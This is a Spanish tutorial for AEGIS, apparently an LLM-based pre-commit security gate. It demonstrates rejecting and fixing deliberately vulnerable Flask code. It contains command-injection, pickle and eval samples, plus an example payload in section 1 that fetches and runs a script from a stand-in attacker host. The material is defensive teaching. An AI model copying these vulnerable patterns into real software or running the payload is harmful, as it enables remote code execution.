# Guía práctica: ver AEGIS en acción con un RCE

**Verificación de un commit vulnerable, paso a paso**

| | |
|---|---|
| Versión | 1.0 — AEGIS 0.1.0 |
| Objetivo | Subir un fichero Python con ejecución remota de comandos y observar el rechazo del servidor, la corrección y la attestation firmada |
| Duración | 15–20 minutos (el análisis consume tokens reales del proveedor) |
| Requisitos | Python 3.11+, `uv`, `git`, API key de Command Code con acceso a la Provider API |

> Todos los resultados mostrados en esta guía se observaron ejecutando el
> procedimiento completo. El texto de la explicación del modelo varía entre
> ejecuciones; la **estructura** del mensaje y el **veredicto** no.

---

## 0. Modelo mental: hay tres roles, no dos

Antes de tocar nada conviene tener claro dónde ocurre cada cosa, porque es el punto
que más se malinterpreta:

| Rol | Proceso | Qué tiene | Qué **no** tiene |
|---|---|---|---|
| **Hook** (cliente) | `aegis-hook`, dentro del repo, al hacer `git commit` | el token de usuario | prompt, API key del modelo, lógica de análisis |
| **Servidor de análisis** | `aegis serve`, proceso aparte | prompt, API key del modelo, clave de firma | el repositorio completo: solo recibe los hunks |
| **CI** | GitHub Actions | la clave pública (JWKS) | prompt, API key, LLM |

El hook **no puede analizar nada por sí mismo**. Se comprueba así:

```text
$ python -c "import aegis.cli.hook, sys; print([m for m in sys.modules if 'aegis.llm' in m])"
[]
```

Y si el servidor no está disponible, el commit se bloquea porque no hubo análisis:

```text
🚨 AEGIS: no se pudo completar el análisis y la política es fail-closed.
```

**GitHub Actions no llama a ningún modelo.** Solo verifica firmas de forma offline.

---

## 1. El código con RCE

Crea este fichero. Es ejecución remota de comandos por inyección de comandos:
`shell=True` más interpolación de una cadena significa que el atacante ejecuta lo que
quiera con los privilegios del proceso.

```python
"""Panel de diagnóstico de red — RCE por inyección de comandos."""

import subprocess

from flask import Flask, request

app = Flask(__name__)


@app.route("/diag")
def diag():
    # `host` lo controla cualquiera que pueda llamar a /diag
    host = request.args["host"]
    command = f"nslookup {host}"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return {"output": result.stdout}
```

Por qué esto es RCE y no "solo" inyección de comandos:

```text
GET /diag?host=example.com; curl http://atacante/shell.sh | sh
                       └─ el `;` corta el comando y ejecuta el resto con los
                          privilegios del proceso Flask
```

---

## 2. Terminal 1 — preparar y arrancar el servidor

```bash
cd ~/ruta/a/aegis-gate
cp .env.example .env
```

`.env` está en `.gitignore`: nunca debe commitearse. Edítalo y pon tu clave del
proveedor (si ya tienes `~/.commandcode/auth.json`, este paso es opcional):

```dotenv
AEGIS_LLM_MODEL=gpt-6-luna
AEGIS_LLM_API_KEY=user_TU_CLAVE_AQUI
```

```bash
uv sync --all-extras --group dev
uv run aegis serve
```

**Deberías ver:**

```text
INFO:     Started server process [12345]
INFO:     Waiting for application startup.
aegis server ready: env=local issuer=http://127.0.0.1:8088 kid=fLrAhZ5Sw0vyPFXN provider=local
INFO:     Application startup complete.
INFO:     Uvicorn running on http://127.0.0.1:8088
```

Comprueba desde otra terminal:

```bash
curl -s http://127.0.0.1:8088/healthz
```

```json
{"status":"ok","env":"local","kid":"fLrAhZ5Sw0vyPFXN","issuer":"http://127.0.0.1:8088","provider":"local"}
```

> Este proceso es el único que tiene el prompt, la API key del modelo y la clave de
> firma. Es el "servidor" del diseño: en esta demo corre en tu máquina; en producción
> va en un host aparte, alcanzable por los desarrolladores y por CI.

---

## 3. Crear el usuario y autenticarse

```bash
cd ~/ruta/a/aegis-gate

# Usuario del IdP local (el email debe ser el que uses en git)
uv run aegis user add --email tu-email@empresa.com --name "Tu Nombre"

# Login mediante OAuth 2.0 Device Flow
uv run aegis login
```

**Deberías ver:**

```text
  AEGIS · inicio de sesión
  1. Abre: http://127.0.0.1:8088/device
  2. Código: MSCM-JJXK
  (esperando autorización…)
```

Abre la URL, introduce el código, el email y la contraseña, y pulsa **Autorizar**:

```text
  ✓ Autenticado como tu-email@empresa.com (scopes: analyze)
  cache: TokenCache(path=/Users/tu-usuario/.config/aegis/token.json, backend=file)
```

Comprueba el entorno, incluida **de dónde sale la clave del modelo**:

```bash
uv run aegis doctor
```

```text
aegis 0.1.0
server_url        : http://127.0.0.1:8088
token_cache       : /Users/tu-usuario/.config/aegis/token.json (mode=600)
fail_mode         : closed
env_token_allowed : True
llm_provider      : commandcode
llm_model         : gpt-6-luna
llm_wire          : auto
llm_api_key       : user_…GTuz (len 93)
llm_key_source    : environment (AEGIS_LLM_API_KEY)
prompt            : prompts/analyze.v1.md
auth              : OK as tu-email@empresa.com scopes=['analyze']
```

---

## 4. Terminal 2 — el repositorio que va a pasar por el gate

```bash
mkdir ~/demo-rce && cd ~/demo-rce
git init -b main
git config user.email "tu-email@empresa.com"     # debe coincidir con el login
git config user.name  "Tu Nombre"
git remote add origin git@github.com:tu-org/demo-rce.git
```

Crea `.pre-commit-config.yaml`, sustituyendo `/RUTA/A/aegis-gate` por la ruta real:

```yaml
default_install_hook_types: [pre-commit, post-commit, pre-push]
repos:
  - repo: local
    hooks:
      - id: aegis-analyze
        name: "AEGIS · análisis GenAI server-side (OWASP Top 10)"
        entry: /RUTA/A/aegis-gate/.venv/bin/aegis-hook
        language: system
        pass_filenames: false      # el hook lee el índice, no la lista de ficheros
        require_serial: true
        stages: [pre-commit]
      - id: aegis-attest
        name: "AEGIS · adjuntar attestation al commit"
        entry: /RUTA/A/aegis-gate/.venv/bin/aegis-attest
        language: system
        pass_filenames: false
        always_run: true
        stages: [post-commit]
      - id: aegis-verify
        name: "AEGIS · verificar attestations del push"
        entry: /RUTA/A/aegis-gate/.venv/bin/aegis-pre-push
        language: system
        pass_filenames: false
        always_run: true
        stages: [pre-push]
```

Instala los tres hooks:

```bash
/RUTA/A/aegis-gate/.venv/bin/pre-commit install --install-hooks
```

```text
pre-commit installed at .git/hooks/pre-commit
pre-commit installed at .git/hooks/post-commit
pre-commit installed at .git/hooks/pre-push
```

Commit inicial saltándose el gate (el repositorio aún no tiene nada que analizar):

```bash
echo "demo" > README.md
git add README.md
git commit --no-verify -m "chore: init"
```

---

## 5. El momento clave: commitear el RCE

Exporta en **esta terminal** las variables para que el hook las vea. El hook corre con
tu entorno, no con el `.env` de otro repositorio:

```bash
export AEGIS_SERVER_URL=http://127.0.0.1:8088
export AEGIS_TOKEN_CACHE=$HOME/.config/aegis/token.json
```

Guarda el fichero del paso 1 como `rce_diag.py` y haz el commit:

```bash
git add rce_diag.py
git commit -m "feat(diag): endpoint de diagnóstico de red"
```

**Deberías ver** el commit abortado:

```text
AEGIS · análisis GenAI server-side (OWASP Top 10)........................Failed
- hook id: aegis-analyze
- exit code: 1

🚨 Vulnerabilidad detectada — commit rechazado
   Autor del commit: tu-email@empresa.com

1. [HIGH] Remote code execution through the diag host parameter
   Categoría: A03:2021   CWE-78   (rce_diag.py:14)
   Confianza: 99%   Regla: A03-CMDI-001

   Riesgo:
     A remote caller controls the `host` query parameter, which is interpolated
     into a string executed with `shell=True`. Shell metacharacters (`;`, `|`,
     `$(...)`) let the caller run arbitrary commands with the Flask process's
     privileges.

   Solución sugerida:
     Pass the binary and its arguments as a list with shell execution disabled,
     and validate `host` against an allowlist or parse it as a hostname.

   Patch propuesto:
     result = subprocess.run(["nslookup", host], capture_output=True, text=True, check=False)

   Análisis: an_ba43cbdd67f046808e1e
   Corrige los puntos anteriores y vuelve a hacer commit.
```

Verifica que **el commit no existe**:

```bash
git log --oneline     # HEAD sigue en "chore: init"
git status --short     # rce_diag.py sigue en el índice (staged)
```

Y en la terminal 1, el servidor habrá registrado:

```text
INFO:     127.0.0.1:65111 - "POST /v1/analyze HTTP/1.1" 200 OK
```

---

## 6. Qué hizo el servidor por dentro

Mientras el servidor sigue en marcha, consulta el registro de auditoría:

```bash
cd ~/ruta/a/aegis-gate
uv run python -c "
import sqlite3, json
c = sqlite3.connect('.aegis/aegis.db'); c.row_factory = sqlite3.Row
for r in c.execute('SELECT seq, action, actor, detail FROM audit_log ORDER BY seq DESC LIMIT 3'):
    d = json.loads(r['detail'])
    print(f\"#{r['seq']} {r['action']:<15} {r['actor']:<28} decision={d.get('decision')} findings={d.get('findings')} anchors={d.get('anchors')}\")
"
```

```text
#4 analyze.block   tu-email@empresa.com         decision=block findings=1 anchors=2
#3 analyze.request tu-email@empresa.com         decision=None findings=None anchors=None
#2 analyze.allow   tu-email@empresa.com         decision=allow findings=0 anchors=0
```

`anchors=2` es el prefilter determinista: `subprocess.run(` con datos de entrada y
`shell=True`. Aunque el modelo hubiera fallado o hubiera sido manipulado, esos dos
anclas ya bloqueaban.

---

## 7. Corregir el código y obtener la aprobación

Reemplaza `rce_diag.py` por la versión segura:

```python
"""Panel de diagnóstico de red — versión corregida."""

import ipaddress
import subprocess

from flask import Flask, request

app = Flask(__name__)


@app.route("/diag")
def diag():
    raw = request.args.get("host", "").strip()
    try:
        # Solo direcciones IP literales: nada de nombres, nada de metacaracteres.
        target = str(ipaddress.ip_address(raw))
    except ValueError:
        return {"error": "invalid host"}, 400

    # Lista de argumentos + shell=False: el valor no puede convertirse en sintaxis.
    result = subprocess.run(
        ["nslookup", target], capture_output=True, text=True, check=False, timeout=5
    )
    return {"output": result.stdout}
```

```bash
git add rce_diag.py
git commit -m "fix(diag): valida el host y ejecuta sin shell"
```

**Deberías ver:**

```text
AEGIS · análisis GenAI server-side (OWASP Top 10)........................Passed
AEGIS · adjuntar attestation al commit...................................Passed

[main 07eefa1] fix(diag): valida el host y ejecuta sin shell
 1 file changed, 21 insertions(+), 9 deletions(-)
```

La attestation queda anclada al commit como git note:

```bash
git notes --ref=aegis show HEAD
```

```json
{
  "analysis_id": "an_0e52ca28e283450c8d43",
  "attestation": "eyJhbGciOiJFZERTQSIsImtpZCI6IjdpblU3SGVYQm...",
  "commit_digest": "91f375aa05aee3c1db75e4fc4539cc4b...",
  "decision": "allow",
  "version": 1
}
```

---

## 8. Verificar la integridad tú mismo

```bash
aegis keys export --out .aegis/jwks.json    # fija el ancla de confianza
aegis verify --range HEAD~1..HEAD
```

```text
  AEGIS · verificación de integridad  (github.com/tu-org/demo-rce)
  rango: HEAD~1..HEAD   commits: 1   claves: 7inU7HeXBh0ZJvnZ

  ✅ 07eefa1c2a3b  ok
       verified as tu-email@empresa.com · prompt analyze.v1@1ff3b58ff416 · 0 finding(s)
       atestiguado por tu-email@empresa.com · allow · gpt-6-luna

  resumen: {'ok': 1}
```

La verificación es **offline**: solo necesita el JWKS, no el servidor.

---

## 9. Comprobar las evasiones

### 9.1 Saltarse el hook con `--no-verify`

```bash
# vuelve a poner el código vulnerable y salta el gate
git commit --no-verify -m "feat: diag (sin hook)"
aegis verify --range HEAD~1..HEAD
```

```text
  AEGIS · verificación de integridad  (github.com/tu-org/demo-rce)

  ⛔ 3f2a1b9c8d7e  missing_attestation
       no attestation for this commit: it was pushed without the pre-commit gate
       (e.g. `git commit --no-verify`)

  ✗ Verificación FALLIDA: los commits marcados no están cubiertos por una
    attestation válida.
    Un commit sin attestation suele significar `git commit --no-verify` o un
    hook no instalado. Vuelve a hacer el commit con el hook activo.
```

Código de salida: `5`.

### 9.2 Push con historia no atestiguada

```bash
git push origin main
```

```text
AEGIS · verificar attestations del push..................................Failed
- hook id: aegis-verify
- exit code: 5

  AEGIS · ✗ 1 de 1 commit(s) sin attestation válida:
    3f2a1b9c8d7e  missing_attestation: no attestation for this commit: it was
    pushed without the pre-commit gate (e.g. `git commit --no-verify`)

  CI rechazará este push. Para arreglarlo, rehaz el commit con el hook activo
  (`pre-commit install`) o reescribe la historia con commits analizados.
  Si el servidor está caído, un operador puede emitir un override firmado.

error: failed to push some refs to 'git@github.com:tu-org/demo-rce.git'
```

### 9.3 `amend` después de un `allow`

Analizas el código limpio, se permite, y luego cambias el contenido en el mismo
commit:

```text
  commit analizado: 2019cbf
  tras amend:       eb4e7e6
  · eb4e7e6b17e4  unverified_local
       no attestation (report-only mode)
```

El commit nuevo no hereda la prueba del anterior: el digest cambió, y `aegis-attest`
se niega a anclar una attestation que no corresponde.

---

## 10. GitHub Actions

**GitHub Actions no llama a ningún modelo.** Solo verifica firmas. Para que tu
repositorio de demo lo tenga, añade `.github/workflows/aegis-integrity.yml`:

```yaml
name: aegis-integrity
on: [push, pull_request]
jobs:
  verify:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      # Las attestations viven en refs/notes/aegis: un checkout normal NO las trae.
      - name: Traer las attestations
        run: git fetch origin refs/notes/aegis:refs/notes/aegis || true

      - uses: astral-sh/setup-uv@v5
      - run: uv python install 3.12
      - run: pip install "git+https://github.com/Sierris/aegis-gate@main"

      - name: Verificar
        run: aegis verify --range "${{ github.event.before }}..${{ github.sha }}"
```

Y sube las notas **además de** la rama:

```bash
git push origin main
git push origin refs/notes/aegis
```

Dos precisiones:

1. **`.aegis/jwks.json` debe estar commiteado** (o pasar la URL con la variable
   `AEGIS_JWKS`). Es la clave pública, no un secreto, y su cambio se revisa como un
   diff: es el único artefacto cuyo cambio *debe* ser visible.
2. **GitHub Actions no puede alcanzar tu `127.0.0.1:8088`**, y no lo necesita. El
   servidor analiza; CI verifica. Esa es la separación del diseño.

---

## 11. Variante: RCE por deserialización

Un segundo caso, más específico de Python:

```python
"""Restauración de sesión — RCE por deserialización."""

import base64
import pickle

from flask import Flask, request

app = Flask(__name__)


@app.route("/restore")
def restore():
    blob = base64.b64decode(request.args["state"])
    session = pickle.loads(blob)  # ejecuta __reduce__ del objeto recibido
    return {"user": session.get("user")}
```

Un `pickle.loads` sobre datos del cliente permite ejecutar código arbitrario durante
la deserialización (a través de `__reduce__`). El gate lo marca como
**A03:2021 / CWE-502**.

Otra variante directa, si quieres el caso más minimalista:

```python
@app.route("/calc")
def calc():
    return str(eval(request.args["expr"]))    # eval de entrada del usuario
```

---

## 12. Problemas típicos

| Síntoma | Causa | Solución |
|---|---|---|
| `✗ not authenticated` | el hook no ve tu token | `export AEGIS_TOKEN_CACHE=$HOME/.config/aegis/token.json` |
| `identity_mismatch` (HTTP 403) | `git config user.email` distinto del login | iguala los dos valores |
| `no se pudo completar el análisis... fail-closed` | el servidor no está levantado | `aegis serve` en la terminal 1 |
| El hook nunca se ejecuta | `pre-commit` no instalado en ese repo | `pre-commit install --install-hooks` |
| `403 ... Cloudflare 1010` | User-Agent bloqueado por el edge | no sustituyas el UA del adapter |
| `403 MODEL_NOT_IN_PLAN` | el modelo no está en tu plan | `aegis models` y elige uno de los listados |
| El commit pasa sin mensaje | no había nada staged | `git add` primero: el hook lee el índice |
| `no note found for object` | la attestation solo se escribe en `post-commit` | instala también ese hook (`default_install_hook_types`) |

---

## 13. Resumen en una línea

El LLM vive en el servidor, el hook solo transporta, y GitHub Actions solo comprueba
firmas. Si quieres ver el análisis, mira el servidor; si quieres ver el control real,
mira `aegis verify`.
